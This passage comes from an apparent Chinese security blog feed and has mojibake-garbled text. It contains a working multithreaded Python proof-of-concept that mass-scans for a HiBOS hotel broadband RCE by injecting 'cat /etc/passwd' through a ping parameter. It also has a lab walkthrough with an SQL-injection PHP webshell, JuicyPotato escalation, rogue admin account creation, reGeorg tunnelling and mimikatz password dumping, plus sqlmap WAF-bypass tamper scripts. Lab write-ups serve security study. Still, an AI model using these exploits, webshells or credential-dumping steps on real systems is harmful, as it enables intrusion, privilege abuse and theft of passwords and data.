f:</span></span><br><span class="line"><span class="string">            for line in f.readlines():</span></span><br><span class="line"><span class="string">                url = line.strip()</span></span><br><span class="line"><span class="string">                url = parse_url(url)</span></span><br><span class="line"><span class="string">                exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print(&quot;[*] End .......                [*]&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if url !=&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    banner()</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨å¤šçº¿ç¨‹ æŠŠç»“æœå­˜å¤„output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">thread = []</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*  HiBOSé…’åº—å®½å¸¦è¿è¥ç³»ç»ŸRCEæ¼æ´POCv0.2  *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -u ,--url url                   &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[*]urlå½¢å¼ä¸ç¬¦åˆï¼ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">    req = requests.get(url=url1, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(req.status_code)</span></span><br><span class="line"></span><br><span class="line">    url2 = url + <span class="string">&#x27;/aaa.txt&#x27;</span></span><br><span class="line">    <span class="comment"># print(url2)</span></span><br><span class="line">    req2 = requests.get(url=url2, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root:x:0:0:root:/root:/bin/bash&#x27;</span> <span class="keyword">in</span> req2.text:</span><br><span class="line">        print(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;--------------å­˜åœ¨æ¼æ´[*]&quot;</span>)</span><br><span class="line">        output = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&quot;a+&quot;</span>)  </span><br><span class="line">        output.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        output.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;-------------ä¸å­˜åœ¨æ¼æ´[*]&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, default = <span class="string">&#x27;&#x27;</span> , <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å…¥url&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>, default= <span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;æ”¶é›†çš„txt&#x27;</span>)</span><br><span class="line">    (option, args) = parser.parse_args()</span><br><span class="line">    <span class="comment"># print(parser.parse_args())</span></span><br><span class="line">    url = option.url</span><br><span class="line">    file = option.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] Start .......              [*]&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                url = line.strip()</span><br><span class="line">                url = parse_url(url)</span><br><span class="line"></span><br><span class="line">                t = threading.Thread(target=exp, args=(url,))</span><br><span class="line">                thread.append(t)</span><br><span class="line">        print(thread)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.join()</span><br><span class="line">                <span class="comment"># exp(url)</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;[*] End .......                [*]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        exp(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>POC</tag>
      </tags>
  </entry>
  <entry>
    <title>zkaqå†…ç½‘é¶åœº1</title>
    <url>/posts/3796bdc4/</url>
    <content><![CDATA[<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>è¾“å…¥ <code>?id=1&#39;</code> ç½‘ç«™æŠ¥é”™ çˆ†å‡ºç½‘ç«™çš„ç»å¯¹è·¯å¾„</p>
<p><img src="/posts/3796bdc4/dir.png"></p>
<p>?id=1 order by 2 å‘ç°å­˜åœ¨ä¸¤ä¸ªå­—æ®µ</p>
<p>ä½¿ç”¨union selectæ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨ into outfile è¿›è¡Œæ–‡ä»¶å†™å…¥</p>
<p><code>?id = 1 and 1=2 union select 1,2 into outfile &#39;C:/phpStudy/WWW/m.txt&#39;</code></p>
<p>è®¿é—®  m.txt æˆåŠŸå†™å…¥</p>
<p><img src="/posts/3796bdc4/m.png"></p>
<p>å°è¯•å†™å…¥ä¸€å¥è¯åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸­</p>
<p><code>?id=1 union select 1,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/zzz.php&#39;</code></p>
<p>è®¿é—®mm.phpå‘ç°æˆåŠŸå†™å…¥ï¼Œä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥</p>
<h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>è¿›å…¥ç»ˆç«¯æŸ¥çœ‹å½“å‰æƒé™ <code>whoami</code> å‘ç°æƒé™ä¸º testæƒé™</p>
<p><code>ipconfig </code>å‘ç°å†…ç½‘ip ä¸º 10.0.1.4</p>
<p><code>netstat -ano</code> æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£</p>
<p><code>tasklist</code> æŸ¥çœ‹è¿è¡Œçš„è¿›ç¨‹</p>
<p><code>systeminfo</code>  æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ è¡¥ä¸å· </p>
<p><img src="/posts/3796bdc4/buding.png"></p>
<p><a href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a> </p>
<p>å»è¿™ä¸ªç½‘ç«™æ‰¾ä¸€ä¸‹å¯ä»¥åˆ©ç”¨çš„exp</p>
<br>

<h4 id="JuicyPotatoææƒ"><a href="#JuicyPotatoææƒ" class="headerlink" title="JuicyPotatoææƒ"></a>JuicyPotatoææƒ</h4><p>HotPotatoææƒ</p>
<p>ä¸Šä¼  JuicyPotato.exe </p>
<p><code>bbb.exe -p &quot;whoami&quot;</code></p>
<p><img src="/posts/3796bdc4/potato.png"></p>
<p>ææƒä¸ºsystemæƒé™ï¼Œç„¶åå†æ·»åŠ ç”¨æˆ·</p>
<p><code>net user Mamor A1S2D3! /add</code> </p>
<p> bbb.exe -p â€œnet localgroup administrators Mamor /addâ€  //å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„æƒé™</p>
<p><img src="/posts/3796bdc4/netuser1.png"></p>
<p>net user æŸ¥çœ‹æ˜¯å¦åˆ›å»ºæˆåŠŸ</p>
<p><img src="/posts/3796bdc4/netuser2.png"></p>
<p>æˆåŠŸåˆ›å»ºç”¨æˆ·</p>
<br>

<h4 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h4><p>å†…ç½‘ç©¿é€ä¸¤ç§æ–¹æ³•:<br>1.è®©ç›®æ ‡æœºå™¨å»è¿æ¥å¤–ç½‘ä¸»æœº(éœ€è¦å…¬ç½‘ip)  å‰ææ˜¯ç›®æ ‡å¯ä»¥è®¿é—®å¤–ç½‘<br>2.åœ¨ç›®æ ‡æœºå™¨ä¸Šè®¾ç½®ä¿¡å·ç«™(æ”¾ä¸€ä¸ªwebæ–‡ä»¶å¸¦ç›®æ ‡æœåŠ¡å™¨ï¼Œæ‰€æœ‰çš„æµé‡éƒ½è¦é€šè¿‡è¿™ä¸ªæ–‡ä»¶)</p>
<p>ä½¿ç”¨reGeorgè¿›è¡Œå†…ç½‘ç©¿é€ </p>
<p>å°† reGeorgä¸­çš„ tunnel.nosocket.php ä¼ åˆ°ç›®æ ‡æœºå™¨ æ”¹åä¸ºreG.php</p>
<p>å†å…¬ç½‘è®¿é—®ä¸‹ </p>
<p><img src="/posts/3796bdc4/reG1.png"></p>
<p>æœ¬æœºæ‰§è¡Œ (python2)</p>
<p><code>python reGeorgSocksProxy.py -l 127.0.0.1 -p 9999 -u http://afsgr16-b1ferw.aqlab.cn/reG.php</code></p>
<p><img src="/posts/3796bdc4/reGrun.png"></p>
<p>æœ¬æœºä½¿ç”¨Proxifier è®¾ç½®ä»£ç†æœåŠ¡å™¨ 127.0.0.1 9999 socks5</p>
<p><img src="/posts/3796bdc4/Proxy.png"></p>
<p>è®¾ç½®ä»£ç†è§„åˆ™ </p>
<p><img src="/posts/3796bdc4/Proxy2.png"></p>
<p>è®¾ç½®å®Œä»£ç†å ä½¿ç”¨ mstsc è¿œç¨‹è¿æ¥10.0.1.4 æˆåŠŸç™»å½•</p>
<br>

<h4 id="ä½¿ç”¨-mimikatz-è¯»å–å¯†ç "><a href="#ä½¿ç”¨-mimikatz-è¯»å–å¯†ç " class="headerlink" title="ä½¿ç”¨ mimikatz è¯»å–å¯†ç "></a>ä½¿ç”¨ mimikatz è¯»å–å¯†ç </h4><p>å°† mimikatzé€šè¿‡èšå‰‘ä¸Šä¼ åˆ°æœåŠ¡å™¨ ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼ˆwindows2012/2016ä¸èƒ½æŠ“ï¼‰</p>
<p>ææƒ<code> privilege::debug</code></p>
<p><img src="/posts/3796bdc4/mm2.png"></p>
<p>æŠ“å–å¯†ç  <code>sekurlsa::logonpasswords</code></p>
<p>æˆåŠŸæŠ“å–åˆ°Administratorå¯†ç  woshifengge1.</p>
<p><img src="/posts/3796bdc4/mm3.png"></p>
<br>

<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>æ¢æµ‹å†…ç½‘ä¸­æ˜¯å¦è¿˜æœ‰å…¶å®ƒä¸»æœº</p>
<p>mstsc å°è¯•è¿æ¥10.0.1.8 ä½¿ç”¨admin å¯†ç æˆåŠŸç™»å½•</p>
<p>å¾—åˆ°flag</p>
<p><img src="/posts/3796bdc4/flag.png"></p>
]]></content>
      <categories>
        <category>zkaq</category>
      </categories>
      <tags>
        <tag>zkaq</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap_tamper</title>
    <url>/posts/f47a5413/</url>
    <content><![CDATA[<h3 id="å‡ ä¸ªå¸¸ç”¨çš„tamper"><a href="#å‡ ä¸ªå¸¸ç”¨çš„tamper" class="headerlink" title="å‡ ä¸ªå¸¸ç”¨çš„tamper"></a>å‡ ä¸ªå¸¸ç”¨çš„tamper</h3><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“: All

ä½œç”¨: è¿›è¡Œbase64ç¼–ç 

ä½¿ç”¨å‰: ` tamper(&quot;1&#39; AND SLEEP(5)#&quot;)`

ä½¿ç”¨å: `&#39;MScgQU5EIFNMRUVQKDUpIw==&#39;`
</code></pre>
<br>

<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“: All

ä½œç”¨: æŠŠç©ºæ ¼æ›¿æ¢ä¸º  `+`

ä½¿ç”¨å‰:  `tamper(&#39;SELECT id FROM users&#39;)`

ä½¿ç”¨å: `&#39;SELECT+id+FROM+users&#39;`
</code></pre>
<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h4><pre><code>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼š Microsoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0

ä½œç”¨: æŠŠç©ºæ ¼æ›¿æ¢ä¸º` /**/`

ä½¿ç”¨å‰: `tamper(&#39;SELECT id FROM users&#39;)`

ä½¿ç”¨å: `&#39;SELECT/**/id/**/FROM/**/users&#39;`
</code></pre>
<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h4><pre><code>ä½œç”¨:  æŠŠç©ºæ ¼æ¢ä¸ºå…¶ä»–æœ‰æ•ˆå­—ç¬¦

ä½¿ç”¨å‰:  `tamper(&#39;SELECT id FROM users&#39;)`

ä½¿ç”¨å:  `&#39;SELECT%0Did%0CFROM%0Ausers&#39;`
</code></pre>
<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šMySQL

æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1

ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€™%09â€™, â€˜%0Aâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Bâ€™)

ä½¿ç”¨å‰ï¼š`tamper(&#39;SELECT id FROM users&#39;)`

ä½¿ç”¨åï¼š`&#39;SELECT%A0id%0CFROM%0Dusers&#39;`
</code></pre>
<h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šAll

ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º--ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦

ä½¿ç”¨å‰ï¼š`tamper(&#39;1 AND 9227=9227&#39;)`

ä½¿ç”¨åï¼š`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`
</code></pre>
<br>

<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“:  All

ä½œç”¨: ä½¿ç”¨æ³¨é‡Šç¬¦åˆ†å‰² SQLå…³é”®å­—

ä½¿ç”¨å‰:  `tamper(&#39;INSERT&#39;)`

ä½¿ç”¨å:  `I/**/NS/**/ERT`
</code></pre>
<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h4><pre><code>ä½œç”¨: å°†payloadéšæœºå¤§å°å†™

æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0

ä½¿ç”¨å‰: `tamper(&#39;SELECT id FROM `user`&#39;)`

ä½¿ç”¨å:  `&#39;SeLeCt id FrOm `user`&#39;`
</code></pre>
<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h4><pre><code>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0

ä½œç”¨: å¯¹payloadè¿›è¡Œurlç¼–ç 

ä½¿ç”¨å‰: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`

ä½¿ç”¨å: `&#39;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#39;`
</code></pre>
<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“:  All

ä½œç”¨:  å¯¹payloadè¿›è¡ŒäºŒæ¬¡urlç¼–ç 

ä½¿ç”¨å‰: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`

ä½¿ç”¨å: `&#39;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#39;`
</code></pre>
<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šAll

ä½œç”¨ï¼šç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼

ä½¿ç”¨å‰ï¼š`tamper(&quot;1&#39; AND 1=1&quot;)`

ä½¿ç”¨åï¼š`1%bf%27 AND 1=1--`
</code></pre>
<br>

<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šAll

ä½œç”¨ï¼šä½œä¸ºåŒé‡æŸ¥è¯¢è¯­å¥ï¼Œç”¨åŒé‡è¯­å¥æ›¿ä»£é¢„å®šä¹‰çš„sqlå…³é”®å­—ï¼ˆé€‚ç”¨äºéå¸¸å¼±çš„è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚å°†selectæ›¿æ¢ä¸ºç©ºï¼‰

ä½¿ç”¨å‰ï¼š`tamper(&#39;1 UNION SELECT 2--&#39;)`

ä½¿ç”¨åï¼š`1 UNIOUNIONN SELESELECTCT 2--`
</code></pre>
<br>

<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šAll

ä½œç”¨ï¼šè¿½åŠ ç‰¹å®šçš„å­—ç¬¦ä¸²

ä½¿ç”¨è„šæœ¬å‰ï¼š`tamper(&#39;1 AND 1=1&#39;)`

ä½¿ç”¨è„šæœ¬åï¼š`1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;`
</code></pre>
<br>

<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šMySQL

æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0

ä½œç”¨ï¼šè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨mysqlå†…è”æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ³¨å…¥

ä½¿ç”¨å‰ï¼š`tamper(&#39;1 AND 2&gt;1--&#39;)`

ä½¿ç”¨åï¼š`1 /*!30874AND 2&gt;1*/--`
</code></pre>
<br>

<h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><pre><code>ä½œç”¨ï¼š æŠŠç­‰å·æ›¿æ¢ä¸ºLIKE

ä½¿ç”¨å‰ï¼š `tamper(&#39;SELECT * FROM users WHERE id=1&#39;)`

ä½¿ç”¨åï¼š`&#39;SELECT * FROM users WHERE id LIKE 1&#39;`
</code></pre>
<br>

<br>

<h3 id="sqlmap-tamperç¼–å†™"><a href="#sqlmap-tamperç¼–å†™" class="headerlink" title="sqlmap tamperç¼–å†™"></a>sqlmap tamperç¼–å†™</h3><p>å…ˆçœ‹ä¸€ä¸ªæœ€ç®€å•çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…±ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œpriorityå˜é‡å®šä¹‰å’Œdependenciesã€tamperå‡½æ•°å®šä¹‰ã€‚</p>
<p>priority å®šä¹‰è„šæœ¬çš„ä¼˜å…ˆçº§ï¼Œå¯ç”¨äºå¤šä¸ªtamperè„šæœ¬çš„æƒ…å†µä¸‹</p>
<p>dependencieså‡½æ•°å£°æ˜è„šæœ¬çš„é€‚ç”¨èŒƒå›´å’Œä¸é€‚ç”¨èŒƒå›´ï¼Œå¯ä»¥ä¸ºç©ºå€¼</p>
<p>tamperå‡½æ•°ä¸ºä¸»è¦å‡½æ•°ï¼Œæ¥å—å‚æ•°ä¸ºpayload å’Œ**kwargsï¼Œè¿™ä¸ªè„šæœ¬çš„è¿”å›å€¼ä¸ºæ›¿æ¢åçš„payloadï¼Œåœ¨è¿™é‡Œå¼•å·è¢«æ›¿æ¢æˆäº† <code>\\&#39;</code></p>
<br>

<p>ä¸‹é¢è¿™ä¸ªæ˜¯åˆ©ç”¨å†…è”æ³¨é‡Šå’Œæ³¨é‡Šæ··æ·†ç»•å®‰å…¨ç‹—çš„tamperï¼Œå…·ä½“çš„å¯ä»¥æ ¹æ®æƒ…å†µç¨ä½œä¿®æ”¹ï¼Œè¿›è¡Œæ›¿æ¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;/*!*/=/*!*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;ORDER&quot;</span>,<span class="string">&quot;/*!ORDER/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;AND&quot;</span>,<span class="string">&quot;/*!AND/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;FROM&quot;</span>,<span class="string">&quot;/*!FROM/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;OR&quot;</span>,<span class="string">&quot;/*!OR/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UNION&quot;</span>,<span class="string">&quot;/*!UNION/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SELECT&quot;</span>,<span class="string">&quot;/*!SELECT/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;USER()&quot;</span>,<span class="string">&quot;/*!USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;DATABASE()&quot;</span>,<span class="string">&quot;/*!DATABASE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;VERSION()&quot;</span>,<span class="string">&quot;/*!VERSION/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SESSION_USER()&quot;</span>,<span class="string">&quot;/*!SESSION_USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;EXTRACTVALUE&quot;</span>,<span class="string">&quot;/*!EXTRACTVALUE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UPDATEXML&quot;</span>,<span class="string">&quot;/*!UPDATEXML/*!/*/**/*/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmapos-shellä½¿ç”¨</title>
    <url>/posts/a92f908a/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒè¯´æ˜"><a href="#ç¯å¢ƒè¯´æ˜" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h3><p>phpstudy + sqlilab æœ¬åœ°æµ‹è¯•</p>
<br>

<h3 id="os-shell-æ¡ä»¶"><a href="#os-shell-æ¡ä»¶" class="headerlink" title="os-shell æ¡ä»¶"></a>os-shell æ¡ä»¶</h3><ol>
<li>ç½‘ç«™å¿…é¡»ä¸ºrootæƒé™</li>
<li>çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„</li>
<li>PHPå…³é—­é­”æœ¯å¼•å·(GPC)ï¼Œphpä¸»åŠ¨è½¬ä¹‰åŠŸèƒ½å…³é—­</li>
<li>secure_file_priv= å€¼ä¸ºç©º</li>
